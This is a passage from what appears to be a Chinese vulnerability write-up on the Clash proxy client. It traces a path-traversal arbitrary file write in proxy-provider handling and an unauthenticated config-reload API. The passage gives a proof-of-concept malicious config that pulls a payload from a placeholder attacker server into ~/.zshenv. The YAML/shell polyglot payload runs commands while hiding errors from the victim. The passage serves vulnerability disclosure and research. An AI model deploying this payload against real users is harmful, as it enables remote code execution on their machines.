class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> proxyProviderSchema <span class="keyword">struct</span> &#123;</span><br><span class="line">Type        <span class="type">string</span>            <span class="string">`provider:&quot;type&quot;`</span></span><br><span class="line">Path        <span class="type">string</span>            <span class="string">`provider:&quot;path&quot;`</span></span><br><span class="line">URL         <span class="type">string</span>            <span class="string">`provider:&quot;url,omitempty&quot;`</span></span><br><span class="line">Interval    <span class="type">int</span>               <span class="string">`provider:&quot;interval,omitempty&quot;`</span></span><br><span class="line">Filter      <span class="type">string</span>            <span class="string">`provider:&quot;filter,omitempty&quot;`</span></span><br><span class="line">HealthCheck healthCheckSchema <span class="string">`provider:&quot;health-check,omitempty&quot;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>ParseProxyProvider</code>中，使用了<code>constant.Path.Resolve</code>对<code>Path</code>做了处理。</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">path := C.Path.Resolve(schema.Path)</span><br></pre></td></tr></table></figure><p><img src="/img/post/clash-unauth-force-configs-csrf-rce/parse-ParseProxyProvider.png" alt="parse-ParseProxyProvider"></p><p>那么进入到<code>contant/path.go</code>文件中，<code>Resolve</code>内容如下。</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Resolve return a absolute path or a relative path with homedir</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *path)</span></span> Resolve(path <span class="type">string</span>) <span class="type">string</span> &#123;</span><br><span class="line"><span class="keyword">if</span> !filepath.IsAbs(path) &#123;</span><br><span class="line"><span class="keyword">return</span> filepath.Join(p.HomeDir(), path)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> path</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>p.HomeDir()</code>的值通过如下代码可以得知，就是<code>~/.config/clash</code>。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> Name = <span class="string">&quot;clash&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Path is used to get the configuration path</span></span><br><span class="line"><span class="keyword">var</span> Path = <span class="function"><span class="keyword">func</span><span class="params">()</span></span> *path &#123;</span><br><span class="line">homeDir, err := os.UserHomeDir()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">homeDir, _ = os.Getwd()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">homeDir = P.Join(homeDir, <span class="string">&quot;.config&quot;</span>, Name)</span><br><span class="line"><span class="keyword">return</span> &amp;path&#123;homeDir: homeDir, configFile: <span class="string">&quot;config.yaml&quot;</span>&#125;</span><br><span class="line">&#125;()</span><br></pre></td></tr></table></figure><p>回到上面，<code>Resolve</code>会将<code>/Users/$USERNAME/.config/clash/</code>与主配置文件中<code>proxy-providers</code>的<code>path</code>参数值<code>www.gwggwebsite.top/provider-us.yaml</code>进行拼接，然后返回到<code>ParseProxyProvider</code>函数中的<code>path</code>变量，最后<code>path</code>变量的值为<code>/Users/$USERNAME/.config/clash/www.gwggwebsite.top/provider-us.yaml</code>，当然如果你是Linux系统，会略有所不同。</p><p>继续往下，判断<code>schema.Type</code>的值，如果是<code>http</code>，则将<code>schema.URL</code>和<code>path</code>传入到<code>NewHTTPVehicle</code>函数，在其中会返回一个<code>HTTPVehicle</code>结构体数据，然后赋值给<code>vehicle</code>。<code>schema.URL</code>的值对应的是主配置文件中<code>proxy-providers</code>的<code>url</code>参数值<code>https://www.gwggwebsite.top/clash/proxies?c=US</code>。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">path := C.Path.Resolve(schema.Path)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> vehicle types.Vehicle</span><br><span class="line"><span class="keyword">switch</span> schema.Type &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;file&quot;</span>:</span><br><span class="line">vehicle = NewFileVehicle(path)</span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;http&quot;</span>:</span><br><span class="line">vehicle = NewHTTPVehicle(schema.URL, path)</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, fmt.Errorf(<span class="string">&quot;%w: %s&quot;</span>, errVehicleType, schema.Type)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interval := time.Duration(<span class="type">uint</span>(schema.Interval)) * time.Second</span><br><span class="line">filter := schema.Filter</span><br><span class="line"><span class="keyword">return</span> NewProxySetProvider(name, interval, filter, vehicle, hc)</span><br></pre></td></tr></table></figure><p>然后调用<code>NewProxySetProvider</code>函数，进入到<code>NewProxySetProvider</code>函数中，最后返回<code>wrapper</code>。只需明白<code>wrapper</code>中包含provider的名称、远程URL <code>url</code>、本地路径<code>path</code>，更新时间间隔<code>interval</code>等信息。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewProxySetProvider</span><span class="params">(name <span class="type">string</span>, interval time.Duration, filter <span class="type">string</span>, vehicle types.Vehicle, hc *HealthCheck)</span></span> (*ProxySetProvider, <span class="type">error</span>) &#123;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">  </span><br><span class="line">fetcher := newFetcher(name, interval, vehicle, proxiesParseAndFilter, onUpdate)</span><br><span class="line">pd.fetcher = fetcher</span><br><span class="line"></span><br><span class="line">wrapper := &amp;ProxySetProvider&#123;pd&#125;</span><br><span class="line">runtime.SetFinalizer(wrapper, stopProxyProvider)</span><br><span class="line"><span class="keyword">return</span> wrapper, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/img/post/clash-unauth-force-configs-csrf-rce/provider-newFetcher.png" alt="provider-newFetcher"></p><p><code>wrapper</code>最终返回到<code>config/config.go</code>中作为<code>pd</code>变量的值。pd作为值赋给<code>providersMap[&quot;us&quot;]</code>。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pd, err := provider.ParseProxyProvider(name, mapping)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, <span class="literal">nil</span>, fmt.Errorf(<span class="string">&quot;parse proxy provider %s error: %w&quot;</span>, name, err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">providersMap[name] = pd</span><br></pre></td></tr></table></figure><p><img src="/img/post/clash-unauth-force-configs-csrf-rce/clash-parse-debug.png" alt="clash-parse-debug"></p><h3 id="initial-providers"><a href="#initial-providers" class="headerlink" title="initial providers"></a>initial providers</h3><p>上面的for循环结束后，来到下面的for语句中，进行初始化<code>providersMap</code>中的各个<code>provider</code>，也就是上一个环节中的<code>pd</code>。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> _, provider := <span class="keyword">range</span> providersMap &#123;</span><br><span class="line">log.Infoln(<span class="string">&quot;Start initial provider %s&quot;</span>, provider.Name())</span><br><span class="line"><span class="keyword">if</span> err := provider.Initial(); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, <span class="literal">nil</span>, fmt.Errorf(<span class="string">&quot;initial proxy provider %s error: %w&quot;</span>, provider.Name(), err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么则直接跟进<code>provider.Initial()</code>，达到<code>adapter/provider/provider.go</code>文件中。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(pp *proxySetProvider)</span></span> Initial() <span class="type">error</span> &#123;</span><br><span class="line">elm, err := pp.fetcher.Initial()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pp.onUpdate(elm)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再进入到<code>pp.fetcher.Initial()</code>，发现存在<code>safeWrite</code>。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> f.vehicle.Type() != types.File &amp;&amp; !isLocal &#123;</span><br><span class="line"><span class="keyword">if</span> err := safeWrite(f.vehicle.Path(), buf); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/img/post/clash-unauth-force-configs-csrf-rce/fetcher-Initial.png" alt="fetcher-Initial"></p><p><code>safeWrite</code>函数实现如下。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">safeWrite</span><span class="params">(path <span class="type">string</span>, buf []<span class="type">byte</span>)</span></span> <span class="type">error</span> &#123;</span><br><span class="line">dir := filepath.Dir(path)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> _, err := os.Stat(dir); os.IsNotExist(err) &#123;</span><br><span class="line"><span class="keyword">if</span> err := os.MkdirAll(dir, dirMode); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> os.WriteFile(path, buf, fileMode)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此处<code>path</code>参数的值就是第一阶段parse providers时的那个<code>path</code>参数，其值就是<code>/Users/$USERNAME/.config/clash/www.gwggwebsite.top/provider-us.yaml</code>。</p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>根据以上parse和initial providers的一整个流程，可以发现<code>https://www.gwggwebsite.top/clash/proxies?c=US</code>的远程内容被下载到本地的<code>/Users/$USERNAME/.config/clash/www.gwggwebsite.top/provider-us.yaml</code>路径。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">proxy-providers:</span></span><br><span class="line">  <span class="attr">us:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">http</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">&quot;https://www.gwggwebsite.top/clash/proxies?c=US&quot;</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">www.gwggwebsite.top/provider-us.yaml</span></span><br><span class="line">    <span class="attr">health-check:</span></span><br><span class="line">      <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">      <span class="attr">interval:</span> <span class="number">600</span></span><br><span class="line">      <span class="attr">url:</span> <span class="string">http://www.gstatic.com/generate_204</span></span><br></pre></td></tr></table></figure><p>如下代码，对来自外部的<code>path</code>没有任何判断，不仅支持绝对的路径，而且在使用了<code>filepath.Join</code>拼接路径时，没有考虑路径穿越的问题。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// @File: adapter/provider/parser.go</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ParseProxyProvider</span><span class="params">(name <span class="type">string</span>, mapping <span class="keyword">map</span>[<span class="type">string</span>]any)</span></span> (types.ProxyProvider, <span class="type">error</span>) &#123;</span><br><span class="line"><span class="comment">// ... </span></span><br><span class="line"></span><br><span class="line">path := C.Path.Resolve(schema.Path)</span><br><span class="line">  </span><br><span class="line"><span class="comment">// ... </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// @File: constant/path.go</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *path)</span></span> Resolve(path <span class="type">string</span>) <span class="type">string</span> &#123;</span><br><span class="line"><span class="keyword">if</span> !filepath.IsAbs(path) &#123;</span><br><span class="line"><span class="keyword">return</span> filepath.Join(p.HomeDir(), path)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> path</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在向本地<code>WriteFile</code>写文件时，也应该限制只可以将文件写入<code>/Users/$USERNAME/.config/clash/</code>目录之中。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// @File: adapter/provider/fetcher.go</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">safeWrite</span><span class="params">(path <span class="type">string</span>, buf []<span class="type">byte</span>)</span></span> <span class="type">error</span> &#123;</span><br><span class="line">dir := filepath.Dir(path)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> _, err := os.Stat(dir); os.IsNotExist(err) &#123;</span><br><span class="line"><span class="keyword">if</span> err := os.MkdirAll(dir, dirMode); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> os.WriteFile(path, buf, fileMode)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此处也就存在一个路径穿越漏洞，而且<code>path</code>参数的文件名和其文件内容是可控的，那么最终就导致任意位置任意文件写入，不过需要注意的是写入的文件内容需要符合yaml格式。</p><p>那将文件写入到哪儿，才能最大化利用这个漏洞呢？在Linux系统上可以写入<code>~/.bash_profile</code>、<code>~/.profile</code>、<code>~/.bashrc</code>这三个文件之中；在macOS中也可以写入到这三个文件中，除此之外，还可以写zsh相关的配置文件<code>~/.zshenv</code>；对于Windows系统，利用方式在历史漏洞章节已经提过了。下面给出一个示例的恶意主配置文件内容。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">mixed-port:</span> <span class="number">7890</span></span><br><span class="line"><span class="attr">allow-lan:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">mode:</span> <span class="string">rule</span></span><br><span class="line"><span class="attr">log-level:</span> <span class="string">warning</span></span><br><span class="line"><span class="attr">proxy-providers:</span></span><br><span class="line">  <span class="attr">provider1:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">http</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">&#x27;http://<span class="template-variable">&#123;&#123;yourevilser&#125;&#125;</span>/evil.yaml&#x27;</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="number">3600</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">../../.zshenv</span></span><br><span class="line">    <span class="attr">healthcheck:</span></span><br><span class="line">      <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">      <span class="attr">interval:</span> <span class="number">600</span></span><br><span class="line">      <span class="attr">url:</span> <span class="string">http://www.gstatic.com/generate_204</span></span><br></pre></td></tr></table></figure><p>其中<code>evil.yaml</code>内容如下，由于Clash对格式做了检查，如果不符合yaml格式则会报错，所以此处不仅需要符合yaml格式，最好还要尽可能的符合shell格式，以防止在执行命令的过程中报错被受害者发觉，如下的<code>&lt;&lt;!</code>在shell中意味着多行注释。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">open</span> <span class="string">/System/Applications/Calculator.app;rm</span> <span class="string">-f</span> <span class="string">~/.zshenv;bash</span> <span class="string">-c</span> <span class="string">&#x27;nohup sleep 10 2&gt;&amp;1 &gt; /dev/null &amp;&#x27;</span> <span class="string">&lt;&lt;!:</span></span><br><span class="line">  <span class="attr">aaaaa:</span> <span class="number">11111</span></span><br><span class="line"></span><br><span class="line"><span class="attr">proxies:</span></span><br><span class="line">  <span class="bullet">-</span> &#123;<span class="attr">name:</span> <span class="string">vP</span>, <span class="attr">server:</span> <span class="string">n04.a00x.party</span>, <span class="attr">port:</span> <span class="number">18000</span>, <span class="attr">type:</span> <span class="string">ssr</span>, <span class="attr">cipher:</span> <span class="string">aes-256-cfb</span>, <span class="attr">password:</span> <span class="string">AFX92CS</span>, <span class="attr">protocol:</span> <span class="string">auth_aes128_sha1</span>, <span class="attr">obfs:</span> <span class="string">http_simple</span>, <span class="attr">protocol-param:</span> <span class="number">232991</span><span class="string">:xSnSFv</span>, <span class="attr">obfs-param:</span> <span class="string">download.windowsupdate.com</span>, <span class="attr">udp:</span> <span class="literal">true</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="attr">aaaaa:</span> <span class="number">2222</span></span><br></pre></td></tr></table></figure><h2 id="0x04-RESTful-API"><a href="#0x04-RESTful-API" class="headerlink" title="0x04 RESTful API"></a>0x04 RESTful API</h2><p>但是可以发现，上面那种利用方式的局限性就在于，需要受害者手动去导入一个不可信的远程配置，这对于攻击者来说，未必是那么容易实现。那么有没有一种方式能让受害者自动导入一个不可信的远程配置呢？</p><p>根据Clash官方文档的介绍（<a href="https://clash.gitbook.io/doc/restful-api">https://clash.gitbook.io/doc/restful-api</a>），Clash存在一套RESTful API可以用于控制自身，能获取Clash中的一些信息，同时也能控制Clash内部的配置。</p><p>在Clash的配置文件中加入<code>external-controller</code>字段，即可去访问。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$ grep external config.yaml &amp;&amp; curl 127.0.0.1:9090</span><br><span class="line">external-controller: 127.0.0.1:9090</span><br><span class="line">&#123;<span class="string">&quot;hello&quot;</span>:<span class="string">&quot;clash&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获得Clash当前的基础配置</span></span><br><span class="line">$ curl -s http://127.0.0.1:9090/configs | jq .</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;port&quot;</span>: 7890,</span><br><span class="line">  <span class="string">&quot;socks-port&quot;</span>: 7891,</span><br><span class="line">  <span class="string">&quot;redir-port&quot;</span>: 0,</span><br><span class="line">  <span class="string">&quot;tproxy-port&quot;</span>: 0,</span><br><span class="line">  <span class="string">&quot;mixed-port&quot;</span>: 0,</span><br><span class="line">  <span class="string">&quot;authentication&quot;</span>: [],</span><br><span class="line">  <span class="string">&quot;allow-lan&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="string">&quot;bind-address&quot;</span>: <span class="string">&quot;*&quot;</span>,</span><br><span class="line">  <span class="string">&quot;mode&quot;</span>: <span class="string">&quot;rule&quot;</span>,</span><br><span class="line">  <span class="string">&quot;log-level&quot;</span>: <span class="string">&quot;info&quot;</span>,</span><br><span class="line">  <span class="string">&quot;ipv6&quot;</span>: <span class="literal">false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>并且根据官方的如下建议，建议当<code>external-controller</code>为<code>0.0.0.0</code>时，此时一定要加上<code>secret</code>进行鉴权。</p><blockquote><p>如果不是为了特殊需求，请尽量不要把 API 暴露在 0.0.0.0，如果真的要这么做，一定要加上 secret 进行鉴权</p></blockquote><p><img src="/img/post/clash-unauth-force-configs-csrf-rce/clash-on-internet.png" alt="clash-on-internet"></p><p>上图是公网暴露的Clash，它们的<code>external-controller</code>均为<code>0.0.0.0</code>。</p><p>而官方给出的建议还造成了一点误解，当<code>external-controller</code>不为<code>0.0.0.0</code>时，鉴权是不是就变得无关紧要了呢？导致大部分人在大部分情况下，会将主配置文件中<code>external-controller</code>的值改为非<code>0.0.0.0</code>的值（例如<code>127.0.0.1</code>），<code>secret</code>则会直接留空。在实际中见到的主配置文件，里面确实都是没有<code>secret</code>的。</p><p>在鉴权这一问题上，CFW比Clash与ClashX做的要安全很多。CFW初次打开，如果<code>~/.config/clash/config.yaml</code>文件不存在，则会生成的一个默认主配置文件，在此配置中不仅会随机化<code>external-controller</code>的端口，而且还会使用一个36位长度的随机字符串作为<code>secret</code>的值，并且从外部更新得到的主配置不会影响原默认<code>external-controller</code>和<code>secret</code>的配置，无论何时都需要鉴权。所以CFW的RESTful API相对安全，使用CFW的的用户也相对安全。</p><p>继续查阅RESTful API接口，发现某个API可以重新加载配置文件，这里倒是引起了注意力。</p><p><img src="/img/post/clash-unauth-force-configs-csrf-rce/put-clash-configs.png" alt="put-clash-configs"></p><p>对重新加载配置文件功能点进行白盒代码审计，首先先跟进<code>/configs</code>路由的代码。</p><p><img src="/img/post/clash-unauth-force-configs-csrf-rce/clash-updateConfigs.png" alt="clash-updateConfigs"></p><p>关键代码<code>updateConfigs</code>函数的内容如下。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// @File: hub/route/configs.go</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">updateConfigs</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">req := <span class="keyword">struct</span> &#123;</span><br><span class="line">Path    <span class="type">string</span> <span class="string">`json:&quot;path&quot;`</span></span><br><span class="line">Payload <span class="type">string</span> <span class="string">`json:&quot;payload&quot;`</span></span><br><span class="line">&#125;&#123;&#125;</span><br><span class="line"><span class="keyword">if</span> err := render.DecodeJSON(r.Body, &amp;req); err != <span class="literal">nil</span> &#123;</span><br><span class="line">render.Status(r, http.StatusBadRequest)</span><br><span class="line">render.JSON(w, r, ErrBadRequest)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">force := r.URL.Query().Get(<span class="string">&quot;force&quot;</span>) == <span class="string">&quot;true&quot;</span></span><br><span class="line"><span class="keyword">var</span> cfg *config.Config</span><br><span class="line"><span class="keyword">var</span> err <span class="type">error</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> req.Payload != <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">cfg, err = executor.ParseWithBytes([]<span class="type">byte</span>(req.Payload))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">render.Status(r, http.StatusBadRequest)</span><br><span class="line">render.JSON(w, r, newError(err.Error()))</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> req.Path == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">req.Path = constant.Path.Config()</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> !filepath.IsAbs(req.Path) &#123;</span><br><span class="line">render.Status(r, http.StatusBadRequest)</span><br><span class="line">render.JSON(w, r, newError(<span class="string">&quot;path is not a absolute path&quot;</span>))</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cfg, err = executor.ParseWithPath(req.Path)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">render.Status(r, http.StatusBadRequest)</span><br><span class="line">render.JSON(w, r, newError(err.Error()))</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">executor.ApplyConfig(cfg, force)</span><br><span class="line">render.NoContent(w, r)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当<code>payload</code>参数传入重载的配置文件内容不为空的时候，往下继续判断要指定重载的配置文件路径<code>path</code>参数是否为空，如果为空，则是默认值<code>~/.config/clash/config.yaml</code>。最后到<code>executor.ApplyConfig(cfg, force)</code>处理。</p><p>先跟进<code>executor.ParseWithBytes</code>，位于文件<code>hub/executor/executor.go </code>，内容如下。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ParseWithBytes config with buffer</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ParseWithBytes</span><span class="params">(buf []<span class="type">byte</span>)</span></span> (*config.Config, <span class="type">error</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> config.Parse(buf)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>继续进入<code>config.Parse</code>，位于文件<code>config/config.go</code>，内容如下。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Parse config</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Parse</span><span class="params">(buf []<span class="type">byte</span>)</span></span> (*Config, <span class="type">error</span>) &#123;</span><br><span class="line">rawCfg, err := UnmarshalRawConfig(buf)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ParseRawConfig(rawCfg)</span><br><span 